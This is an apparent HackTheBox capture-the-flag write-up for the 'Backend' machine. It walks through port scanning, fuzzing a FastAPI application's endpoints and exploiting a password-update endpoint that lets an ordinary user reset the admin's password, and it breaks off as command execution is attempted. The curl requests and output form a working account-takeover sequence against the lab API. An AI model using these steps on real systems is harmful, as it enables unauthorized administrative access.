# [backend](https://app.hackthebox.com/machines/462)

> A Linux server hosting a custom [FastAPI](https://fastapi.tiangolo.com/) API. Though the API enforces authorization on its endpoints, it contains a vulnerable endpoint that allows any user to change the password of any other user. Exploiting this vulnerability to change an administrator's password grants elevated access to the API. The API contains endpoints only accessible to administrator that grant file read and command execution capabilities. The command execution endpoint requires a `debug` key in a user's JWT which is not default even in JWTs granted to administrators. However, the file read endpoint can be leveraged to leak the API's JWT secret, making it possible to forge a JWT with the `debug` key and access the command execution endpoint. With command execution on the server, `root`'s password can be found in the API's authentication log.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.227.148 --rate=1000 -e tun0 --output-format grepable --output-filename enum/backend.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-17 16:15:25 GMT
Initiating SYN Stealth Scan
	Scanning 1 hosts [65535 ports/host]
$ cat enum/backend.masscan | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

According to [launchpad.net](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.4), the target's OpenSSH banner indicates its operating system is Ubuntu 20.04.

The application on port 80 appears to be an API. Its server header is `uvicorn`, indicating it is likely powered by a Python backend web application framework. Several requests return JSON responses, one of which indicates it is indeed an API.

```bash
$ nmap -p22,80 -sC -sV 10.129.227.148 -oA enum/backend
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-17 12:52 EDT
Nmap scan report for 10.129.227.148
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     date: Wed, 17 Aug 2022 21:03:44 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest:
|     HTTP/1.1 200 OK
|     date: Wed, 17 Aug 2022 21:03:32 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     date: Wed, 17 Aug 2022 21:03:38 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=8/17%Time=62FD1CE1%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,AD,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Wed,\x2017\x20Aug\x202022
SF:\x2021:03:32\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2029\r\nc
SF:ontent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"msg\
SF:":\"UHC\x20API\x20Version\x201\.0\"}")%r(HTTPOptions,BF,"HTTP/1\.1\x204
SF:05\x20Method\x20Not\x20Allowed\r\ndate:\x20Wed,\x2017\x20Aug\x202022\x2
SF:021:03:38\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\ncont
SF:ent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail\
SF:":\"Method\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(F
SF:ourOhFourRequest,AD,"HTTP/1\.1\x20404\x20Not\x20Found\r\ndate:\x20Wed,\
SF:x2017\x20Aug\x202022\x2021:03:44\x20GMT\r\nserver:\x20uvicorn\r\nconten
SF:t-length:\x2022\r\ncontent-type:\x20application/json\r\nConnection:\x20
SF:close\r\n\r\n{\"detail\":\"Not\x20Found\"}")%r(GenericLines,76,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20rece
SF:ived\.")%r(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequestT
SF:CP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20r
SF:equest\x20received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(TerminalSe
SF:rverCookie,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20H
SF:TTP\x20request\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.59 seconds
```

### UDP

Nothing of signifiance here.

```bash
$ sudo nmap -sU 10.129.227.148 -oA enum/backend-udp
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-17 12:57 EDT
Nmap scan report for 10.129.227.148
Host is up (0.021s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1011.45 seconds
```

---

## API Endpoint Enumeration

A plain `HTTP GET` request to `/` yields a JSON object that indicates the UHC API Version 1.0.

```bash
$ curl http://10.129.227.148 -v
*   Trying 10.129.227.148:80...
* Connected to 10.129.227.148 (10.129.227.148) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.129.227.148
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< date: Wed, 17 Aug 2022 21:09:05 GMT
< server: uvicorn
< content-length: 29
< content-type: application/json
<
* Connection #0 to host 10.129.227.148 left intact
{"msg":"UHC API Version 1.0"}                                                                                                                               
```

### API Endpoint Discovery

With the mindset that the target is likely an API, discover endpoints using API-specific wordlists. Fuzzing the root yields the endpoints `/api` and `/docs`. The latter returns a 401, indicating it requires authentication.

Navigating to `/api` yields the endpoint `/api/v1`.

```bash
$ curl -v http://10.129.66.42/api
*   Trying 10.129.66.42:80...
* Connected to 10.129.66.42 (10.129.66.42) port 80 (#0)
> GET /api HTTP/1.1
> Host: 10.129.66.42
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< date: Fri, 19 Aug 2022 23:50:55 GMT
< server: uvicorn
< content-length: 20
< content-type: application/json
<
* Connection #0 to host 10.129.66.42 left intact
{"endpoints":["v1"]}                                                          
```

Navigating to `/api/v1` yields the endpoints `/api/v1/user` and `/api/v1/admin`.

```bash
$ curl -v http://10.129.66.42/api/v1
*   Trying 10.129.66.42:80...
* Connected to 10.129.66.42 (10.129.66.42) port 80 (#0)
> GET /api/v1 HTTP/1.1
> Host: 10.129.66.42
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< date: Fri, 19 Aug 2022 23:51:58 GMT
< server: uvicorn
< content-length: 30
< content-type: application/json
<
* Connection #0 to host 10.129.66.42 left intact
{"endpoints":["user","admin"]}                                                
```

`/api/v1/admin` requires authentication.

```bash
$ curl http://10.129.227.148/api/v1/admin/ -v
*   Trying 10.129.227.148:80...
* Connected to 10.129.227.148 (10.129.227.148) port 80 (#0)
> GET /api/v1/admin/ HTTP/1.1
> Host: 10.129.227.148
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< date: Wed, 17 Aug 2022 21:20:22 GMT
< server: uvicorn
< www-authenticate: Bearer
< content-length: 30
< content-type: application/json
<
* Connection #0 to host 10.129.227.148 left intact
{"detail":"Not authenticated"}                                                                                                                              
```

Fuzzing `/api/v1/admin` yields the `/api/v1/admin/file` endpoint, which returns a 405. 

```bash
$ feroxbuster -u http://10.129.227.148/api/v1/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt -n --json --output uhc-api-api-v1-admin-objects.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.227.148/api/v1/admin
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🧔  JSON Output           │ true
 💾  Output File           │ uhc-api-api-v1-admin-objects.txt
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
405      GET        1l        3w       31c http://10.129.227.148/api/v1/admin/file
[####################] - 4s      3132/3132    0s      found:1       errors:0
[####################] - 4s      3132/3132    702/s   http://10.129.227.148/api/v1/admin
```

405 indicates an incorrect HTTP method. Attempting a `POST` requests indicates the endpoint also requires authentication.

```bash
$ curl -X POST -v http://10.129.66.42/api/v1/admin/file
*   Trying 10.129.66.42:80...
* Connected to 10.129.66.42 (10.129.66.42) port 80 (#0)
> POST /api/v1/admin/file HTTP/1.1
> Host: 10.129.66.42
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< date: Fri, 19 Aug 2022 23:54:45 GMT
< server: uvicorn
< www-authenticate: Bearer
< content-length: 30
< content-type: application/json
<
* Connection #0 to host 10.129.66.42 left intact
{"detail":"Not authenticated"}                                                
```

Interestingly, the `/user` endpoint returns a 404.

```bash
$ curl -v http://10.129.227.148/api/v1/user/
*   Trying 10.129.227.148:80...
* Connected to 10.129.227.148 (10.129.227.148) port 80 (#0)
> GET /api/v1/user/ HTTP/1.1
> Host: 10.129.227.148
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< date: Wed, 17 Aug 2022 21:52:24 GMT
< server: uvicorn
< content-length: 22
< content-type: application/json
<
* Connection #0 to host 10.129.227.148 left intact
{"detail":"Not Found"}                                                                                                                                      
```

However, trying input after `user` indicates the format is supposed to be `user/{user_id}`, where `user_id` is an integer.

```bash
$ curl -v http://10.129.227.148/api/v1/user/blah
*   Trying 10.129.227.148:80...
* Connected to 10.129.227.148 (10.129.227.148) port 80 (#0)
> GET /api/v1/user/blah HTTP/1.1
> Host: 10.129.227.148
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 422 Unprocessable Entity
< date: Wed, 17 Aug 2022 21:52:39 GMT
< server: uvicorn
< content-length: 104
< content-type: application/json
<
* Connection #0 to host 10.129.227.148 left intact
{"detail":[{"loc":["path","user_id"],"msg":"value is not a valid integer","type":"type_error.integer"}]}                                                    
```

Fuzzing users indicates there's only one user, with ID `1`.

```bash
$ patator http_fuzz url=http://10.129.227.148/api/v1/user/RANGE0 0=int:0-100 -x ignore:clen=4                                                       130 ⨯
13:46:47 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-08-17 13:46 EDT
13:46:47 patator    INFO -
13:46:47 patator    INFO - code size:clen       time | candidate                          |   num | mesg
13:46:47 patator    INFO - -----------------------------------------------------------------------------
13:46:47 patator    INFO - 200  267:141        0.054 | 1                                  |     2 | HTTP/1.1 200 OK
13:46:48 patator    INFO - Hits/Done/Skip/Fail/Size: 1/101/0/0/101, Avg: 90 r/s, Time: 0h 0m 1s
```

This is the administrative user.

```bash
$ curl -s http://10.129.227.148/api/v1/user/1 | jq
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}              
```

Fuzzing `/api/v1/user` for more endpoints yields three, `/cgi-bin`, `/login`, and `/signup`.

```bash
$ patator http_fuzz method=POST url=http://10.129.227.148/api/v1/user/FILE0 0=objects.txt -x ignore:code=405
14:36:17 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-08-17 14:36 EDT
14:36:17 patator    INFO -
14:36:17 patator    INFO - code size:clen       time | candidate                          |   num | mesg
14:36:17 patator    INFO - -----------------------------------------------------------------------------
14:36:19 patator    INFO - 307  175:-1         0.047 | cgi-bin/                           |   322 | HTTP/1.1 307 Temporary Redirect
14:36:24 patator    INFO - 422  316:172        0.053 | login                              |  1070 | HTTP/1.1 422 Unprocessable Entity
14:36:28 patator    INFO - 422  224:81         0.052 | signup                             |  1632 | HTTP/1.1 422 Unprocessable Entity
14:36:39 patator    INFO - Hits/Done/Skip/Fail/Size: 3/3132/0/0/3132, Avg: 145 r/s, Time: 0h 0m 21s
```

### Final Endpoint Map

- `GET /api`: 200
	- `GET /api/v1`: 200
		- `GET /api/v1/user`: 404
			- `GET /api/v1/user/1`: 200
			- `POST /api/v1/signup`: 200
			- `POST /api/v1/login`: 200
			- `GET /api/v1/cgi-bin` --> `/api/v1/cgi-bin`: 200 (no actual functionality)
		- `/api/v1/admin`: 307 --> `/api/v1/admin/`
		- `/api/v1/admin/`: 401
			- `POST /api/v1/admin/file`: 401
- `/docs`: 401

---

## API User Creation & Authentication

Leverage the `/api/v1/user/signup` endpoint to create a user.

```bash
$ curl -v -H 'Content-Type: application/json' -d '{"email": "tgihf@htb.local", "password": "blah"}' http://10.129.227.148/api/v1/user/signup
*   Trying 10.129.227.148:80...
* Connected to 10.129.227.148 (10.129.227.148) port 80 (#0)
> POST /api/v1/user/signup HTTP/1.1
> Host: 10.129.227.148
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 48
>
* upload completely sent off: 48 out of 48 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< date: Fri, 19 Aug 2022 23:16:29 GMT
< server: uvicorn
< content-length: 2
< content-type: application/json
<
* Connection #0 to host 10.129.227.148 left intact
{}                                                                                                                                                          
```

Authenticate as this user using the `/api/v1/user/login` endpoint, returning a JWT.

```bash
$ curl -s -d 'username=tgihf@htb.local&password=blah' http://10.129.227.148/api/v1/user/login | jq .
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyMjQyLCJpYXQiOjE2NjA5NTEwNDIsInN1YiI6IjMiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYTA3MTQyOTYtOThhNC00OTJjLWI1MTItODhjOGQwNmY5NmI1In0.H04GbB6QPJ_ndekXE0ECjX8AC6rtt_6CjEvQjIQE8EM",
  "token_type": "bearer"
}
```

With authenticated access, retrieve the documentation from `/docs`. It references a SwaggerAPI description at `/openapi.json`.

```bash
$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyMjQyLCJpYXQiOjE2NjA5NTEwNDIsInN1YiI6IjMiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYTA3MTQyOTYtOThhNC00OTJjLWI1MTItODhjOGQwNmY5NmI1In0.H04GbB6QPJ_ndekXE0ECjX8AC6rtt_6CjEvQjIQE8EM' http://10.129.227.148/docs

    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>docs</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,

    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

---

## API Documentation

`/openapi.json`  details several new endpoints:

- `PUT /api/v1/user/SecretFlagEndpoint`
- `POST /api/v1/user/updatepass`
	- Seems to only require user permission
- `GET /api/v1/admin/`
	- Returns true if the current user is an admin
- `POST /api/v1/admin/file`
	- Returns a file on the server, must be admin
- `POST /api/v1/admin/exec/{command}`
	- Executes a command on the server, must be admin

```json
{
  "openapi": "3.0.2",
  "info": {
    "title": "FastAPI",
    "version": "0.1.0"
  },
  "paths": {
    "/": {
      "get": {
        "summary": "Root",
        "description": "Root GET",
        "operationId": "root__get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        }
      }
    },
    "/api": {
      "get": {
        "summary": "List Versions",
        "description": "Versions",
        "operationId": "list_versions_api_get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        }
      }
    },
    "/api/v1": {
      "get": {
        "summary": "List Endpoints V1",
        "description": "Version 1 Endpoints",
        "operationId": "list_endpoints_v1_api_v1_get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        }
      }
    },
    "/docs": {
      "get": {
        "summary": "Get Documentation",
        "operationId": "get_documentation_docs_get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        },
        "security": [
          {
            "OAuth2PasswordBearer": []
          }
        ]
      }
    },
    "/openapi.json": {
      "get": {
        "summary": "Openapi",
        "operationId": "openapi_openapi_json_get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        },
        "security": [
          {
            "OAuth2PasswordBearer": []
          }
        ]
      }
    },
    "/api/v1/user/{user_id}": {
      "get": {
        "tags": [
          "user"
        ],
        "summary": "Fetch User",
        "description": "Fetch a user by ID",
        "operationId": "fetch_user_api_v1_user__user_id__get",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "User Id",
              "type": "integer"
            },
            "name": "user_id",
            "in": "path"
          }
        ],
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/User"
                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/api/v1/user/login": {
      "post": {
        "tags": [
          "user"
        ],
        "summary": "Login",
        "description": "Get the JWT for a user with data from OAuth2 request form body.",
        "operationId": "login_api_v1_user_login_post",
        "requestBody": {
          "content": {
            "application/x-www-form-urlencoded": {
              "schema": {
                "$ref": "#/components/schemas/Body_login_api_v1_user_login_post"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/api/v1/user/signup": {
      "post": {
        "tags": [
          "user"
        ],
        "summary": "Create User Signup",
        "description": "Create new user without the need to be logged in.",
        "operationId": "create_user_signup_api_v1_user_signup_post",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/UserSignup"
              }
            }
          },
          "required": true
        },
        "responses": {
          "201": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/api/v1/user/SecretFlagEndpoint": {
      "put": {
        "tags": [
          "user"
        ],
        "summary": "Get Flag",
        "description": "The User Flag",
        "operationId": "get_flag_api_v1_user_SecretFlagEndpoint_put",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        }
      }
    },
    "/api/v1/user/updatepass": {
      "post": {
        "tags": [
          "user"
        ],
        "summary": "Update Password",
        "description": "Update a user password",
        "operationId": "update_password_api_v1_user_updatepass_post",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/UserPWUpdate"
              }
            }
          },
          "required": true
        },
        "responses": {
          "201": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/api/v1/admin/": {
      "get": {
        "tags": [
          "admin"
        ],
        "summary": "Admin Check",
        "description": "Returns true if the user is admin",
        "operationId": "admin_check_api_v1_admin__get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        },
        "security": [
          {
            "OAuth2PasswordBearer": []
          }
        ]
      }
    },
    "/api/v1/admin/file": {
      "post": {
        "tags": [
          "admin"
        ],
        "summary": "Get File",
        "description": "Returns a file on the server",
        "operationId": "get_file_api_v1_admin_file_post",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/GetFile"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        },
        "security": [
          {
            "OAuth2PasswordBearer": []
          }
        ]
      }
    },
    "/api/v1/admin/exec/{command}": {
      "get": {
        "tags": [
          "admin"
        ],
        "summary": "Run Command",
        "description": "Executes a command. Requires Debug Permissions.",
        "operationId": "run_command_api_v1_admin_exec__command__get",
        "parameters": [
          {
            "required": true,
            "schema": {
              "title": "Command",
              "type": "string"
            },
            "name": "command",
            "in": "path"
          }
        ],
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        },
        "security": [
          {
            "OAuth2PasswordBearer": []
          }
        ]
      }
    }
  },
  "components": {
    "schemas": {
      "Body_login_api_v1_user_login_post": {
        "title": "Body_login_api_v1_user_login_post",
        "required": [
          "username",
          "password"
        ],
        "type": "object",
        "properties": {
          "grant_type": {
            "title": "Grant Type",
            "pattern": "password",
            "type": "string"
          },
          "username": {
            "title": "Username",
            "type": "string"
          },
          "password": {
            "title": "Password",
            "type": "string"
          },
          "scope": {
            "title": "Scope",
            "type": "string",
            "default": ""
          },
          "client_id": {
            "title": "Client Id",
            "type": "string"
          },
          "client_secret": {
            "title": "Client Secret",
            "type": "string"
          }
        }
      },
      "GetFile": {
        "title": "GetFile",
        "required": [
          "file"
        ],
        "type": "object",
        "properties": {
          "file": {
            "title": "File",
            "type": "string"
          }
        }
      },
      "HTTPValidationError": {
        "title": "HTTPValidationError",
        "type": "object",
        "properties": {
          "detail": {
            "title": "Detail",
            "type": "array",
            "items": {
              "$ref": "#/components/schemas/ValidationError"
            }
          }
        }
      },
      "User": {
        "title": "User",
        "type": "object",
        "properties": {
          "guid": {
            "title": "Guid",
            "type": "string"
          },
          "email": {
            "title": "Email",
            "type": "string",
            "format": "email"
          },
          "date": {
            "title": "Date",
            "type": "integer"
          },
          "time_created": {
            "title": "Time Created",
            "type": "integer"
          },
          "is_superuser": {
            "title": "Is Superuser",
            "type": "boolean",
            "default": false
          },
          "id": {
            "title": "Id",
            "type": "integer"
          }
        },
        "description": "Utilized for authentication. Roles:\n-> Listener\n-> Operator\n-> Administrator"
      },
      "UserPWUpdate": {
        "title": "UserPWUpdate",
        "required": [
          "guid",
          "password"
        ],
        "type": "object",
        "properties": {
          "guid": {
            "title": "Guid",
            "type": "string"
          },
          "password": {
            "title": "Password",
            "type": "string"
          }
        }
      },
      "UserSignup": {
        "title": "UserSignup",
        "required": [
          "email",
          "password"
        ],
        "type": "object",
        "properties": {
          "email": {
            "title": "Email",
            "type": "string",
            "format": "email"
          },
          "password": {
            "title": "Password",
            "type": "string"
          }
        }
      },
      "ValidationError": {
        "title": "ValidationError",
        "required": [
          "loc",
          "msg",
          "type"
        ],
        "type": "object",
        "properties": {
          "loc": {
            "title": "Location",
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "msg": {
            "title": "Message",
            "type": "string"
          },
          "type": {
            "title": "Error Type",
            "type": "string"
          }
        }
      }
    },
    "securitySchemes": {
      "OAuth2PasswordBearer": {
        "type": "oauth2",
        "flows": {
          "password": {
            "scopes": {},
            "tokenUrl": "/api/v1/user/login"
          }
        }
      }
    }
  }
}
```

Grab the user flag.

```bash
$ curl -X PUT http://10.129.227.148/api/v1/user/SecretFlagEndpoint
{"user.txt":"..."}                                                                                                             
```

---

## API Privilege Escalation

Elevated access to the API is required to interact with the `/api/v1/admin/file` and `/api/v1/admin/exec` endpoints, either or both of which seem like viable ways forward.

As noted in the Swagger API documentation, the `/api/v1/user/updatepass` endpoint only requires user access. Perhaps it is possible to change another user's password? Change `admin`'s password to `blah`.

```bash
$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyMzE0LCJpYXQiOjE2NjA5NTExMTQsInN1YiI6IjMiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYTA3MTQyOTYtOThhNC00OTJjLWI1MTItODhjOGQwNmY5NmI1In0.zyMPRB6MMWIvZAxgd0ralnMMthGnjT-D51ogTntCbzQ' -H 'Content-Type: application/json' -d '{"guid": "36c2e94a-4271-4259-93bf-c96ad5948284", "password": "blah"}' http://10.129.227.148/api/v1/user/updatepass | jq .
{
  "date": null,
  "id": 1,
  "is_superuser": true,
  "hashed_password": "$2b$12$04I.etNSbMRcRYXLNvdz/ODE95vzlEjFVzNm5Abzb6/ygRaRLplp2",
  "time_created": 1649533388111,
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "last_update": null
}                                                                 
```

Authenticate as `admin@htb.local`.

```bash
$ curl -s -d 'username=admin@htb.local&password=blah' http://10.129.227.148/api/v1/user/login | jq .
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjQyNDk2LCJpYXQiOjE2NjA5NTEyOTYsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.sB2pt3FubfnIdkLZ42COFa13aHDDH3xguz99WcvI8-U",
  "token_type": "bearer"
}
```

---

## Leaking the API Source Code

As `admin`, interact with the `/api/v1/admin/exec` endpoint to attempt to run a command. The response indicates a "debug" key is missing from the JWT.

```bash
